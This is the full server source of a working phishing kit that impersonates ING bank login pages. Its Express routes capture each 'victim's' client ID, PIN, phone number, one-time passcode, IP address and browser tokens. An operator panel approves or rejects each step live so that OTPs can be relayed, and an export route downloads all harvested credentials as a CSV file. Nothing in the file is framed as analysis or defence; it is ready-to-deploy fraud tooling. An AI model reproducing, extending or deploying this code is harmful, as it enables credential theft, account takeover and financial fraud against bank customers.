/* ----------  DEPENDENCIES  ---------- */
const express = require('express');
const cors    = require('cors');
const crypto  = require('crypto');
const session = require('cookie-session');

/* ----------  CONFIG  ---------- */
const PANEL_USER     = process.env.PANEL_USER  || 'admin';
const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

const app  = express();
const PORT = process.env.PORT || 3000;

console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***' });

/* ----------  SIMPLE EVENT BUS  ---------- */
const events = new (require('events')).EventEmitter();
function emitPanelUpdate() { events.emit('panel'); }

// Trust proxy - REQUIRED for Railway/Cloudflare
app.set('trust proxy', ['loopback', 'linklocal', 'uniquelocal']);

// Security headers to prevent extension injection
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  // Prevent Cloudflare analytics and other third-party scripts
  res.setHeader('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self' wss: https:; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:");
  next();
});

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Session middleware - FIXED for Cloudflare proxy
app.use(session({
  name: 'pan_sess',
  keys: [SESSION_SECRET],
  maxAge: 24 * 60 * 60 * 1000,
  sameSite: 'lax',        // Changed from 'none' to 'lax' for better compatibility
  secure: true,           // Always true behind Cloudflare HTTPS
  httpOnly: true,
  domain: undefined       // Auto-detect domain
}));

/* ----------  TOKEN MIDDLEWARE  ---------- */
// Validate tokens from localStorage/sessionStorage via custom headers
function validateTokens(req, res, next) {
  const localToken = req.headers['x-local-token'];
  const sessionToken = req.headers['x-session-token'];
  const clientToken = req.cookies?.client_token || req.headers['x-client-token'];
  
  // Attach to request for use in routes
  req.clientTokens = {
    local: localToken,
    session: sessionToken,
    client: clientToken,
    combined: `${localToken || ''}:${sessionToken || ''}:${clientToken || ''}`
  };
  
  next();
}

app.use(validateTokens);

/* ----------  STATE  ---------- */
const sessionsMap     = new Map();
const sessionActivity = new Map();
const auditLog        = [];
let victimCounter     = 0;
let successfulLogins  = 0;
let currentDomain     = '';

// Token storage for victim sessions
const tokenStore = new Map();

/* ----------  STATIC ROUTES  ---------- */
app.use(express.static(__dirname));

// Block Cloudflare insights requests
app.get('/cdn-cgi/*', (req, res) => res.status(204).end());

app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));

/* ----------  PANEL ACCESS CONTROL  ---------- */
app.get('/panel', (req, res) => {
  if (req.session?.authed === true) return res.sendFile(__dirname + '/_panel.html');
  res.sendFile(__dirname + '/access.html');
});

app.post('/panel/login', (req, res) => {
  const { user, pw, localToken, sessionToken } = req.body;
  
  if (user === PANEL_USER && pw === PANEL_PASS) {
    req.session.authed   = true;
    req.session.username = user;
    req.session.loginTime = Date.now();
    // Store token info in session
    req.session.tokens = { local: localToken, session: sessionToken };
    return res.json({ success: true, redirect: '/panel' });
  }
  res.status(401).json({ success: false, error: 'Invalid credentials' });
});

app.get('/panel/*', (req, res) => res.redirect(302, '/panel'));
app.post('/panel/logout', (req, res) => { 
  req.session = null; 
  res.json({ success: true, redirect: '/panel' });
});
app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));

/* ----------  DOMAIN HELPER  ---------- */
app.use((req, res, next) => {
  const host  = req.headers.host || req.hostname;
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
  next();
});

/* ----------  UA PARSER  ---------- */
function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua)) u.os.name = 'Windows';
  if (/Android/.test(ua)) u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
  if (/Mac/.test(ua)) u.os.name = 'macOS';
  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
  return u;
}

/* ----------  SESSION HEADER HELPER  ---------- */
function getSessionHeader(v) {
  if (v.page === 'success') return `🦁 ING Login approved`;
  if (v.status === 'approved') return `🦁 ING Login approved`;
  if (v.page === 'index.html') {
    return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
  } else if (v.page === 'verify.html') {
    return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
  } else if (v.page === 'unregister.html') {
    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
  } else if (v.page === 'otp.html') {
    if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
    return `🔑 Awaiting OTP...`;
  }
  return `🔑 Awaiting OTP...`;
}

function cleanupSession(sid, reason, silent = false) {
  const v = sessionsMap.get(sid);
  if (!v) return;
  sessionsMap.delete(sid);
  sessionActivity.delete(sid);
  tokenStore.delete(sid);
}

/* ----------  TOKEN GENERATION API  ---------- */
app.post('/api/token', (req, res) => {
  const { sid, type } = req.body;
  const token = crypto.randomBytes(16).toString('hex');
  
  if (sid && sessionsMap.has(sid)) {
    const existing = tokenStore.get(sid) || {};
    existing[type] = token;
    existing[`${type}Time`] = Date.now();
    tokenStore.set(sid, existing);
  }
  
  res.json({ token, type, expires: Date.now() + 3600000 });
});

/* ----------  VICTIM API  ---------- */
app.post('/api/session', async (req, res) => {
  try {
    const sid = crypto.randomUUID();
    const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua  = req.headers['user-agent'] || 'n/a';
    const now = new Date();
    const dateStr = now.toLocaleString();
    
    // Get tokens from request
    const { localToken, sessionToken } = req.body;

    victimCounter++;
    const victim = {
      sid, ip, ua, dateStr,
      entered: false, email: '', password: '', phone: '', otp: '', billing: '',
      page: 'index.html',
      platform: uaParser(ua).os?.name || 'n/a',
      browser: uaParser(ua).browser?.name || 'n/a',
      attempt: 0, totalAttempts: 0, otpAttempt: 0, unregisterClicked: false,
      status: 'loaded', victimNum: victimCounter,
      interactions: [],
      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to page' }],
      tokens: { local: localToken, session: sessionToken }
    };
    sessionsMap.set(sid, victim);
    sessionActivity.set(sid, Date.now());
    
    // Store tokens
    if (localToken || sessionToken) {
      tokenStore.set(sid, { local: localToken, session: sessionToken, created: Date.now() });
    }
    
    res.json({ sid, tokens: { local: localToken, session: sessionToken } });
  } catch (err) {
    console.error('Session creation error', err);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

app.post('/api/ping', (req, res) => {
  const { sid, localToken, sessionToken } = req.body;
  if (sid && sessionsMap.has(sid)) {
    sessionActivity.set(sid, Date.now());
    // Update tokens if provided
    if (localToken || sessionToken) {
      const existing = tokenStore.get(sid) || {};
      if (localToken) existing.local = localToken;
      if (sessionToken) existing.session = sessionToken;
      tokenStore.set(sid, existing);
    }
    return res.sendStatus(200);
  }
  res.sendStatus(404);
});

app.post('/api/login', async (req, res) => {
  try {
    const { sid, email, password, localToken, sessionToken } = req.body;
    if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.entered = true; v.email = email; v.password = password;
    v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
    sessionActivity.set(sid, Date.now());

    // Update tokens
    if (localToken || sessionToken) {
      const existing = tokenStore.get(sid) || {};
      if (localToken) existing.local = localToken;
      if (sessionToken) existing.session = sessionToken;
      tokenStore.set(sid, existing);
      v.tokens = { ...v.tokens, local: localToken, session: sessionToken };
    }

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });

    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua, tokens: v.tokens });
    res.sendStatus(200);
  } catch (err) {
    console.error('Login error', err);
    res.status(500).send('Error');
  }
});

app.post('/api/verify', async (req, res) => {
  try {
    const { sid, phone, localToken, sessionToken } = req.body;
    if (!phone?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.phone = phone; v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    // Update tokens
    if (localToken || sessionToken) {
      const existing = tokenStore.get(sid) || {};
      if (localToken) existing.local = localToken;
      if (sessionToken) existing.session = sessionToken;
      tokenStore.set(sid, existing);
      v.tokens = { ...v.tokens, local: localToken, session: sessionToken };
    }

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });

    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.phone = phone;
    res.sendStatus(200);
  } catch (e) {
    console.error('Verify error', e);
    res.sendStatus(500);
  }
});

app.post('/api/unregister', async (req, res) => {
  try {
    const { sid, localToken, sessionToken } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.unregisterClicked = true; v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    // Update tokens
    if (localToken || sessionToken) {
      const existing = tokenStore.get(sid) || {};
      if (localToken) existing.local = localToken;
      if (sessionToken) existing.session = sessionToken;
      tokenStore.set(sid, existing);
    }

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });

    res.sendStatus(200);
  } catch (err) {
    console.error('Unregister error', err);
    res.sendStatus(500);
  }
});

app.post('/api/otp', async (req, res) => {
  try {
    const { sid, otp, localToken, sessionToken } = req.body;
    if (!otp?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.otp = otp; v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    // Update tokens
    if (localToken || sessionToken) {
      const existing = tokenStore.get(sid) || {};
      if (localToken) existing.local = localToken;
      if (sessionToken) existing.session = sessionToken;
      tokenStore.set(sid, existing);
    }

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });

    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.otp = otp;
    res.sendStatus(200);
  } catch (err) {
    console.error('OTP error', err);
    res.status(500).send('Error');
  }
});

app.post('/api/page', async (req, res) => {
  try {
    const { sid, page, localToken, sessionToken } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    const oldPage = v.page;
    v.page = page;
    sessionActivity.set(sid, Date.now());

    // Update tokens
    if (localToken || sessionToken) {
      const existing = tokenStore.get(sid) || {};
      if (localToken) existing.local = localToken;
      if (sessionToken) existing.session = sessionToken;
      tokenStore.set(sid, existing);
    }

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });

    res.sendStatus(200);
  } catch (err) {
    console.error('Page change error', err);
    res.status(500).send('Error');
  }
});

app.get('/api/status/:sid', (req, res) => {
  const v = sessionsMap.get(req.params.sid);
  if (!v) return res.json({ status: 'gone' });
  res.json({ status: v.status, tokens: v.tokens });
});

app.post('/api/clearRedo', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'redo') v.status = 'loaded';
  res.sendStatus(200);
});

app.post('/api/clearOk', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'ok') v.status = 'loaded';
  res.sendStatus(200);
});

app.post('/api/interaction', (req, res) => {
  const { sid, type, data, localToken, sessionToken } = req.body;
  if (!sessionsMap.has(sid)) return res.sendStatus(404);
  const v = sessionsMap.get(sid);
  v.lastInteraction = Date.now();
  v.interactions = v.interactions || [];
  v.interactions.push({ type, data, time: Date.now() });
  sessionActivity.set(sid, Date.now());
  
  // Update tokens
  if (localToken || sessionToken) {
    const existing = tokenStore.get(sid) || {};
    if (localToken) existing.local = localToken;
    if (sessionToken) existing.session = sessionToken;
    tokenStore.set(sid, existing);
  }
  
  res.sendStatus(200);
});

/* ----------  PANEL API  ---------- */
app.get('/api/user', (req, res) => {
  if (req.session?.authed) return res.json({ 
    username: req.session.username || PANEL_USER,
    tokens: req.session.tokens 
  });
  res.status(401).json({ error: 'Not authenticated' });
});

// helper that builds the payload
function buildPanelPayload() {
  const list = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
    email: v.email, password: v.password, phone: v.phone, otp: v.otp,
    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
    entered: v.entered, unregisterClicked: v.unregisterClicked,
    activityLog: v.activityLog || [],
    tokens: v.tokens || {}
  }));
  return {
    domain: currentDomain,
    username: PANEL_USER,
    totalVictims: victimCounter,
    active: list.length,
    waiting: list.filter(x => x.status === 'wait').length,
    success: successfulLogins,
    sessions: list,
    logs: auditLog.slice(-50).reverse(),
    serverTokens: Array.from(tokenStore.entries()).reduce((acc, [sid, tokens]) => {
      acc[sid] = tokens;
      return acc;
    }, {})
  };
}

app.get('/api/panel', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  // long-poll: wait up to 1 s for an event
  const listener = () => res.json(buildPanelPayload());
  events.once('panel', listener);
  setTimeout(() => {
    events.removeListener('panel', listener);
    res.json(buildPanelPayload());
  }, 1000);
});

app.post('/api/panel', async (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  const { action, sid } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.status(404).json({ ok: false });

  switch (action) {
    case 'redo':
      if (v.page === 'index.html') {
        v.status = 'redo'; v.entered = false; v.email = ''; v.password = ''; v.otp = '';
      } else if (v.page === 'verify.html') {
        v.status = 'redo'; v.phone = '';
      } else if (v.page === 'otp.html') {
        v.status = 'redo'; v.otp = ''; v.otpAttempt++;
      }
      break;
    case 'cont':
      v.status = 'ok';
      if (v.page === 'index.html') v.page = 'verify.html';
      else if (v.page === 'verify.html') v.page = 'unregister.html';
      else if (v.page === 'unregister.html') v.page = 'otp.html';
      else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
      break;
    case 'delete':
      cleanupSession(sid, 'deleted from panel');
      emitPanelUpdate();
      break;
  }
  res.json({ ok: true });
});

/* ----------  CSV EXPORT  ---------- */
app.get('/api/export', (req, res) => {
  if (!req.session?.authed) return res.status(401).send('Unauthorized');

  const successes = auditLog
    .filter(r => r.phone && r.otp)
    .map(r => ({
      victimNum: r.victimN,
      email: r.email,
      password: r.password,
      phone: r.phone,
      otp: r.otp,
      ip: r.ip,
      ua: r.ua,
      localToken: r.tokens?.local || '',
      sessionToken: r.tokens?.session || '',
      timestamp: new Date(r.t).toISOString()
    }));

  const csv = [
    ['Victim#','Email','Password','Phone','OTP','IP','UA','LocalToken','SessionToken','Timestamp'],
    ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
  ].map(r=>r.join(',')).join('\n');

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
  res.send(csv);
});

/* ----------  START  ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Panel user: ${PANEL_USER}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
});
